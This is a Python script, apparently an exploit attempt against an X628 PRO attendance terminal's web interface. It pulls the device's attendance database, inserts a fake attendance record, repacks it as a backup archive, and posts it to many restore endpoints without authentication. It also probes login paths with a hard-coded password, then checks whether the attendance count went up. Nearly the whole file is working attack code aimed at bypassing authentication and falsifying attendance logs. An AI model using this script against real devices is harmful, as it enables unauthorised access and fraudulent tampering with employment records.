"""
Comprehensive web restore attack for X628 PRO May 14 2018 firmware.
Tests:
1. Unauth POST (CVE-2023-4587 restore variant)
2. Auth with known password '891401'
3. Various content-types and endpoints
"""
import os
import sys
import io
import gzip
import sqlite3
import time
import requests
from datetime import datetime

sys.stdout.reconfigure(encoding='utf-8')

DEVICE_IP = '172.16.254.202'
BASE_URL = f'http://{DEVICE_IP}'
WORK_DIR = r'D:/chamcong/zk_fw_attempts/web_restore_test'

# Step 1: Get baseline count
print('='*70)
print('BASELINE')
print('='*70)
r = requests.get(f'{BASE_URL}/form/DataApp?style=1', timeout=15)
print(f'Status: {r.status_code}, size: {len(r.content)} bytes')
# File count is at offset 32 (0x20), 10 bytes decimal
if r.status_code == 200 and r.content[:15] == b'ZK format 1.0.0':
    baseline_count = int(r.content[32:42].rstrip(b'\x00'))
    print(f'Baseline ATTLOG count: {baseline_count}')
else:
    print(f'Header: {r.content[:50]!r}')
    sys.exit(1)

# Step 2: Use cached modified ZKDB.db if available, else recreate
print('\n' + '='*70)
print('PREPARING MODIFIED BACKUP')
print('='*70)
zkdb_path = os.path.join(WORK_DIR, 'ZKDB.db')

# Connect + add ANOTHER unique fake record
conn = sqlite3.connect(zkdb_path)
cur = conn.cursor()
cur.execute('SELECT COUNT(*) FROM ATT_LOG')
cur_count = cur.fetchone()[0]
print(f'Current ATTLOG count in cached ZKDB.db: {cur_count}')

fake_pin = '1'
fake_time = f'2026-09-15T{datetime.now().strftime("%H%M%S")}'
cur.execute('SELECT COUNT(*) FROM ATT_LOG WHERE User_PIN=? AND Verify_Time=?', (fake_pin, fake_time))
exists = cur.fetchone()[0]
if exists == 0:
    cur.execute('SELECT MAX(ID) FROM ATT_LOG')
    max_id = cur.fetchone()[0]
    cur.execute('''INSERT INTO ATT_LOG (User_PIN, Verify_Type, Verify_Time, Status, Work_Code_ID, Sensor_NO, Att_Flag, CREATE_ID, MODIFY_TIME, SEND_FLAG)
                   VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                (fake_pin, 1, fake_time, 0, 0, 0, 0, 'web_restore_v2', fake_time, 0))
    conn.commit()
    print(f'Inserted fake record: PIN={fake_pin} at {fake_time}, new max_id={max_id+1}')
cur.execute('SELECT COUNT(*) FROM ATT_LOG')
new_count = cur.fetchone()[0]
print(f'New count: {new_count} (delta: {new_count - cur_count})')
conn.close()

# Step 3: Read ZKDB.db
with open(zkdb_path, 'rb') as f:
    zkdb_data = f.read()
file_size = len(zkdb_data)
print(f'ZKDB.db: {file_size} bytes')

# Step 4: Re-pack TAR
print('\nRe-packing TAR + GZIP...')
new_tar = bytearray()
hdr = bytearray(512)
hdr[0:8] = b'ZKDB.db'
hdr[100:107] = b'0000755'
hdr[108:112] = b'0000\x00'
hdr[116:120] = b'0000\x00'
size_str = f'{file_size:011o}\x00'.encode()
hdr[124:124+len(size_str)] = size_str
hdr[136:148] = b'15252234061\x00'
hdr[156] = ord('0')
hdr[257:263] = b'ustar\x00'
hdr[148:156] = b'        '
chk = sum(hdr)
chk_str = f'{chk:06o}\x00 '.encode()
hdr[148:148+len(chk_str)] = chk_str
new_tar.extend(hdr)
new_tar.extend(zkdb_data)
pad_len = ((file_size + 511) // 512) * 512 - file_size
new_tar.extend(b'\x00' * pad_len)
new_tar.extend(b'\x00' * 1024)
tar_data = bytes(new_tar)

gz_buf = io.BytesIO()
with gzip.GzipFile(fileobj=gz_buf, mode='wb') as gz_out:
    gz_out.write(tar_data)
gz_data = gz_buf.getvalue()
print(f'Compressed payload: {len(gz_data)} bytes')

# Save the payload
payload_path = os.path.join(WORK_DIR, 'modified_business.dat.gz')
with open(payload_path, 'wb') as f:
    f.write(gz_data)
print(f'Saved: {payload_path}')

# Step 5: Test upload with auth + various methods
print('\n' + '='*70)
print('UPLOAD ATTEMPTS')
print('='*70)

# First, try to get auth state
print('\n[1] Checking web auth state...')
for auth_path in ['/form/DataApp?type=admin', '/form/DataApp?username=admin&password=891401', '/form/Login']:
    try:
        r = requests.get(f'{BASE_URL}{auth_path}', timeout=5)
        print(f'  GET {auth_path}: {r.status_code}, len={len(r.content)}, head={r.content[:80]!r}')
    except Exception as e:
        print(f'  GET {auth_path}: err {e}')

# Test restore WITHOUT auth (CVE-2023-4587 variant)
print('\n[2] RESTORE attempts without auth:')
endpoints = [
    ('POST', '/form/DataApp', gz_data, 'application/octet-stream'),
    ('POST', '/form/DataApp?type=Restore', gz_data, 'application/octet-stream'),
    ('POST', '/form/DataApp?Restore=1', gz_data, 'application/octet-stream'),
    ('POST', '/form/DataApp?action=upload', gz_data, 'application/octet-stream'),
    ('POST', '/form/DataApp?action=restore', gz_data, 'application/octet-stream'),
    ('POST', '/form/SystemData', gz_data, 'application/octet-stream'),
    ('POST', '/form/Restore', gz_data, 'application/octet-stream'),
    ('POST', '/form/UserData', gz_data, 'application/octet-stream'),
    ('POST', '/form/DataApp?type=Backup', gz_data, 'application/octet-stream'),
]

# Also try multipart
files = {'file': ('businessData.dat', gz_data, 'application/octet-stream')}
files_zip = {'file': ('businessData.dat.zip', gz_data, 'application/zip')}
files_data = {'backup': ('businessData.dat', gz_data, 'application/octet-stream')}
files_form = {'RestoreFile': ('businessData.dat', gz_data, 'application/octet-stream')}

multipart_endpoints = [
    '/form/DataApp',
    '/form/DataApp?type=Restore',
    '/form/DataApp?action=upload',
    '/form/DataApp?Restore=1',
    '/form/SystemData',
    '/form/Restore',
    '/form/UserData',
]

for method, ep, body, ctype in endpoints:
    try:
        r = requests.post(f'{BASE_URL}{ep}', data=body, headers={'Content-Type': ctype}, timeout=8)
        print(f'  {method} {ep}: {r.status_code}, len={len(r.content)}, head={r.content[:60]!r}')
        if r.status_code == 200 and len(r.content) > 100:
            print(f'    >> Content: {r.content[:200]!r}')
    except Exception as e:
        print(f'  {method} {ep}: err {type(e).__name__}: {str(e)[:60]}')

print()
for ep in multipart_endpoints:
    try:
        r = requests.post(f'{BASE_URL}{ep}', files=files, timeout=8)
        print(f'  POST_multipart {ep}: {r.status_code}, len={len(r.content)}, head={r.content[:60]!r}')
        if r.status_code == 200 and len(r.content) > 100:
            print(f'    >> Content: {r.content[:200]!r}')
    except Exception as e:
        print(f'  POST_multipart {ep}: err {type(e).__name__}: {str(e)[:60]}')

# Step 6: Check count again
print('\n' + '='*70)
print('VERIFICATION')
print('='*70)
time.sleep(3)
r = requests.get(f'{BASE_URL}/form/DataApp?style=1', timeout=15)
if r.status_code == 200 and r.content[:15] == b'ZK format 1.0.0':
    after_count = int(r.content[32:42].rstrip(b'\x00'))
    print(f'After test count: {after_count}')
    print(f'Baseline was: {baseline_count}')
    if after_count > baseline_count:
        delta = after_count - baseline_count
        print(f'*** COUNT INCREASED BY {delta} ***')
        print(f'*** WEB RESTORE IS WORKING ***')
    elif after_count == baseline_count:
        print('Count unchanged. Upload did not affect device.')
    else:
        print(f'Count went DOWN from {baseline_count} to {after_count} - WEIRD')
else:
    print(f'Header: {r.content[:50]!r}')